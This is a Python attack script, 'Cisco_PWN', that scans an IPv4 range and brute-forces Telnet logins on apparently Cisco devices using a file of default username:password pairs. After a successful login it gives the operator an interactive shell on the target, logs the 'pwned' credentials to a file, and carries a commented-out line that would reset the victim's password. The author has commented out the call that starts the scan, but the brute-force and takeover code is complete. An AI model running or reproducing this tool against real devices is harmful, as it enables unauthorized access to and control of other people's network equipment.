#!/usr/bin/python3

#Meta
__author__ = "AeroBot Development"
__copyright__ = "Copyright 2020, Creative Commons"
__credits__ = ["AeroBot Development"]
__license__ = "MIT, CC"
__version__ = "1.0.0"
__maintainer__ = "AeroBot"
__email__ = "aerobotprofessional@gmail.com"
__status__ = "Open-Source"


#Usage:
#python3 cisco_pwn.py 10.0.0.1 10.0.255.255



# Dependencies
import ipaddress
import socket
import telnetlib
from sys import argv
from colorama import Fore, Back, Style, init # pip install colorama
from prettytable import PrettyTable # pip install prettytable
from os import getcwd, system, name

combo_file = "combos.txt"

def get_logo():
    try:
        with open('logo', "r") as d:
            logo = d.read()
    except:
        print(Fore.RED)
        print(f"Failed To Find Logo File!")
        print(Fore.WHITE)
        logo = '[x]'
    logo = logo + Fore.YELLOW + f"\nWelcome To Cisco_PWN! Starting..." + Fore.WHITE
    return logo    
        
#Cisco Defaults: https://www.lifewire.com/cisco-default-password-list-2619151
class cisco_pwn:
    def __init__(self, address, port, timeout_seconds, combo_filename_and_path, amount_tries):
        self.address = str(address)
        self.port = int(port)
        self.timeout = int(timeout_seconds)
        self.combos = str(combo_filename_and_path)
        self.amount = int(amount_tries)

    def scan(self):
        #MACROS
        Stack = []
        combos = parse_combos(combo_file)
        for x in range(0, self.amount):
            #NESTED MACROS:
            Accepted = False
            Logged_In = False
            #CiscoPro = False
            #Exploitable = False
            status = str()
            Pwned = False

            #Cycle user/pass, bruteforce attempt.
            #Also, catch the index error for the end of our runs :)
            try:
                user = combos['usernames'][x].strip('\n')
                password = combos['passwords'][x].strip('\n')
            except IndexError:
                print(f"""
All Combos Have Been Utilized! Any Luck?
{visualize(Stack)}
""")
                ext = input("[<HIT ENTER TO EXIT>]")
                exit()


            #Notify
            clear()    
            print(f"[#{x + 1}] [Trying `{self.address}`] Using: {user}:{password}...\n")

            #Attempt To Connect To Remote Address
            try:
                tn = telnetlib.Telnet(host=self.address, port=self.port, timeout=self.timeout)
                Accepted = True
            except Exception as E:
                clear()
                #Notify - Failed: Attempt was denied by remote address
                status = "Address Is Actively Denying Telnet Connections!\n"
                print(f"[#{x + 1}] [Result: (MISS) | Remote Machine Refused Telnet/No Telnet Service Present] \n[Used: {user}:{password}]\n[Error: {E}]\n\n\n")
                

    
            #HOST IS ACCEPTING TELNET
            if Accepted is True:
                Logged_In = True
                clear()
                status = "Address Is Accepting Telnet Connections! Attempting Login!\n"
                print(f"---------------------------------\n[#{x + 1}] [Result: (HIT) | Remote Machine Accepting Telnet Connections!] [Using {user}:{password}]\n\n---------------------------------\n\nAttempting Login....")
                # If Host is Accepting Incoming Telnet Connections    
                tn.read_until(b"login: ")
                tn.write(user.encode('ascii') + b"\n")
                if password:
                    tn.read_until(b"Password: ")
                    tn.write(password.encode('ascii') + b"\n")
                try:
                    tn.write(b"ls\n")
                except Exception as f:
                    Logged_In = False
                    clear()
                    status = f"Connected To Remote Machine - Ran Test Command 'ls' and was exited with error:\n {f}"



                #LOGGED IN!!!!!!!!!    
                if Logged_In is True:
                    clear()
                    status = status + "Logged In To Remote Machine! Enter Commands Now!"
                    print("REMOTE MACHINE PWNED!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n")
                    tn.write(b'echo "Logged In Via User: $USER"\n')
                    print(str(tn.read_all().decode('ascii')))
                    while Logged_In is True:
                        try:
                            entries = input(f"\n\n[PWNED_USER@{self.address}]:")
                            tn.write(entries)
                            print(str(tn.read_all().decode('ascii')))
                            #tn.write(b'echo "pwned1337" | passwd --stdin $USER\n')
                            #tn.write(b"exit\n")
                        except Exception as E:
                            print(E)
                            try:
                                tn.write(b'ls\n')
                            except Exception as EE:
                                print("[Connection Lost DuringSession With {self.address}!] Error: \n{EE}")
                                Logged_In = False
                                pass

                            
                    #LOGGING        
                    status = str(status + "TARGET WAS PWNED!\nYou Are In Control (for now)\n\nRaw Responses:\n" + str(tn.read_all().decode('ascii')))
                    Pwned = True
                    

                        
                        
                
            #LOGGING - FINAL
            Stack.append({'index': str(x + 1), 'address': self.address, 'port': str(self.port), 'user_pass': user+":"+password, 'status': status})
            if Pwned is True:
                with open("PWNED.txt", "w+") as f:
                    f.write(visualize(Stack))
                print(f"Pwned session saved @ {getcwd()}/PWNED.txt")    
            
def visualize(data):
    table = PrettyTable()
    table.field_names = ["Index", "Address", "Port", "User:Pass", "Response"]
    for x in range(0, len(data)):
        index = data[x]
        table.add_row([str(index['index']),str(index['address']), str(index['port']), str(index['user_pass']), str(index['status'])])
    return table

def flush():
    print("\r\n", end = "")

def clear():
    if name == 'nt': _ = system('cls')
    else: _ = system('clear')

def parse_combos(combo_file):
    try:
        with open(combo_file, "r") as d:
            lines = d.readlines()
    except Exception as F:
        a = input(f"Error: Couldn't open combos file!\n{F}")
        exit()
    unames = []
    passwds = []
    for x in range(0, len(lines)):
        error = False
        try:
            unames.append(lines[x].split(":")[0])
        except Exception as d:
            error = True
            print(d)
            
        if error is False:
            try:
                passwds.append(lines[x].split(":")[1])
            except Exception as e:
                print(e)
    return {'usernames': unames, 'passwords': passwds}

#COLORAMA PREP.
init()
print()
print(Fore.GREEN)
print(Fore.WHITE)

#Check if cli or a pipe/process
try:
    ip_min = str(argv[1])
    ip_max = str(argv[2])    
except Exception as E:
    ext = input("Bad args! Use: python3 Cisco_PWN.py 10.0.0.1 10.255.255.255\nHit any key and try again!")
    exit()


#MAIN - "Blackhat" - Do not use! Seriously!
    #This script (as is) wont do anything as I've disabled something ;) Good luck kiddies..
    #Hopefully that keeps any random from inadvertedly incriminating themselves.
    #You are responsible for your own stupidity!
def main(ip_min, ip_max):
    #Range Scanner - Validate IPs
    try:
        socket.inet_aton(ip_min)
        ip_min = ipaddress.IPv4Address(ip_min)
    except Exception as E:
        dead = input(f'INVALID IP RANGE: Start IP Is Not A Valid IPV4 Address!\nTry Again!\n{E}')
        exit()
#  Check Arrrrrgs
    try:
        socket.inet_aton(ip_max)
        ip_max = ipaddress.IPv4Address(ip_max)
    except Exception as F:
        dead = input(f'INVALID IP RANGE: End IP Is Not A Valid IPV4 Address!\nTry Again!\n{F}')
        exit()
# All is good, ready for lift-off! 
    for x in range(int(ip_min), int(ip_max)):
        this_ip = str(ipaddress.IPv4Address(x))
        print("Trying >>> " + this_ip + "...")
#        cisco_pwn(this_ip, 23, 1, "combos.txt", 5).scan()
        clear()
    
main(ip_min, ip_max)
        
        
        
        
